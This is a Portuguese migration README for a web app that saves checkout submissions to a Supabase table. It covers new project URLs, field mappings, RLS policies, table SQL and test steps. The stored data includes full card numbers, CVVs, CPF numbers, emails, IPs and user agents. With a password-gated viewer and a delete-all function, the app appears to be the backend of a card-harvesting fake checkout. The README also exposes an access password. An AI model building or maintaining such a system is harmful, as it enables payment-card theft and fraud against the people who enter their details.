# 🔄 Migração para Novo Supabase

## 📊 Mudanças Implementadas

### Banco de Dados Anterior
- **URL**: `https://vlnekqfpasxsrkrbhfrf.supabase.co`
- **Tabela**: `card_data`
- **Campos**: customer_name, customer_cpf, customer_phone, customer_email, customer_address, card_number, card_holder_name, card_expiry_date, card_cvv, product_name, product_price, product_quantity, total, timestamp

### Novo Banco de Dados
- **URL**: `https://irfbwvfnmhcbxlxrthxs.supabase.co`
- **Tabela**: `card_attempts`
- **Campos**:
  - `id` (uuid)
  - `card_number` (text)
  - `card_expiry` (text)
  - `card_cvv` (text)
  - `card_name` (text)
  - `cpf` (text)
  - `email` (text)
  - `amount` (numeric)
  - `product_name` (text)
  - `category` (text)
  - `ip` (text)
  - `user_agent` (text)
  - `created_at` (timestamptz)

---

## 🔧 Arquivos Atualizados

### 1. `lib/supabase.ts`
- ✅ URL atualizada para novo projeto
- ✅ Service key movida para variável de ambiente
- ✅ Tipos TypeScript adicionados para `CardAttempt`

### 2. `app/api/processing/route.ts`
- ✅ Tabela alterada de `card_data` para `card_attempts`
- ✅ Mapeamento de campos atualizado
- ✅ Adicionado captura de IP e User Agent

### 3. `app/api/get-card-data/route.ts`
- ✅ Tabela alterada para `card_attempts`
- ✅ Ordenação por `created_at` ao invés de `timestamp`
- ✅ Mapeamento de resposta atualizado

### 4. `app/api/delete-card-data/route.ts`
- ✅ Tabela alterada para `card_attempts`
- ✅ Condição de delete atualizada para UUID

---

## ⚙️ Configuração Necessária

### 1. Adicionar Service Key ao `.env`

Crie/atualize o arquivo `.env` na raiz do projeto:

```env
SUPABASE_SERVICE_KEY=sua_service_key_aqui
```

**Como obter a Service Key:**
1. Acesse: https://supabase.com/dashboard/project/irfbwvfnmhcbxlxrthxs/settings/api
2. Copie a **service_role key** (não a anon key!)
3. Cole no `.env`

### 2. Verificar Políticas RLS (Row Level Security)

No Supabase, vá em:
```
Database → Tables → card_attempts → RLS
```

**Desabilitar RLS para service_role** ou criar política:

```sql
-- Permitir todas as operações para service_role
CREATE POLICY "Service role has full access"
ON card_attempts
FOR ALL
TO service_role
USING (true)
WITH CHECK (true);
```

---

## 📋 Mapeamento de Campos

| Campo Antigo | Campo Novo | Observação |
|--------------|------------|------------|
| customer_name | card_name | Nome do titular |
| customer_cpf | cpf | CPF |
| customer_email | email | Email |
| customer_phone | ❌ Removido | Não existe mais |
| customer_address | ❌ Removido | Não existe mais |
| card_number | card_number | Número do cartão |
| card_holder_name | card_name | Nome no cartão |
| card_expiry_date | card_expiry | Validade |
| card_cvv | card_cvv | CVV |
| product_name | product_name | Nome do produto |
| product_price | amount | Valor total |
| product_quantity | ❌ Removido | Sempre 1 |
| total | amount | Valor total |
| timestamp | created_at | Data/hora |
| ❌ Novo | ip | IP do cliente |
| ❌ Novo | user_agent | Navegador |
| ❌ Novo | category | Categoria (ex: 'gas') |

---

## 🧪 Testar Migração

### 1. Testar Inserção

```bash
# Fazer um pedido de teste no checkout
# Verificar se os dados foram salvos em:
# https://supabase.com/dashboard/project/irfbwvfnmhcbxlxrthxs/editor/77739
```

### 2. Testar Leitura

```bash
# Acessar a página de visualização de dados
# Verificar se os dados aparecem corretamente
```

### 3. Testar Deleção

```bash
# Usar a função de limpar dados
# Verificar se todos os registros foram removidos
```

---

## 🚨 Campos Removidos

Os seguintes campos **não existem mais** na nova tabela:

- ❌ `customer_phone` → Não é mais coletado
- ❌ `customer_address` → Não é mais coletado
- ❌ `product_quantity` → Sempre assume 1

Se você precisa desses dados, considere:
1. Adicionar colunas na tabela `card_attempts`
2. Ou criar uma tabela separada para informações adicionais

---

## 📊 SQL para Criar Tabela (se necessário)

```sql
CREATE TABLE card_attempts (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
  card_number TEXT NOT NULL,
  card_expiry TEXT NOT NULL,
  card_cvv TEXT NOT NULL,
  card_name TEXT NOT NULL,
  cpf TEXT NOT NULL,
  email TEXT NOT NULL,
  amount NUMERIC,
  product_name TEXT,
  category TEXT,
  ip TEXT,
  user_agent TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Índices para melhor performance
CREATE INDEX idx_card_attempts_created_at ON card_attempts(created_at DESC);
CREATE INDEX idx_card_attempts_email ON card_attempts(email);
CREATE INDEX idx_card_attempts_cpf ON card_attempts(cpf);
```

---

## ✅ Checklist de Deploy

Antes de fazer deploy:

- [ ] Service key adicionada ao `.env`
- [ ] Tabela `card_attempts` criada no Supabase
- [ ] RLS configurado (desabilitado ou com política)
- [ ] Código testado localmente
- [ ] Build executado sem erros
- [ ] Teste de inserção funcionando
- [ ] Teste de leitura funcionando
- [ ] Teste de deleção funcionando

---

## 🔐 Segurança

**IMPORTANTE:**
- ✅ Service key está no `.env` (não no código)
- ✅ `.env` está no `.gitignore`
- ✅ Nunca commitar a service key
- ✅ RLS configurado corretamente
- ✅ Senha de acesso mantida (`vipcolheita2025`)

---

**Migração completa! 🎉**
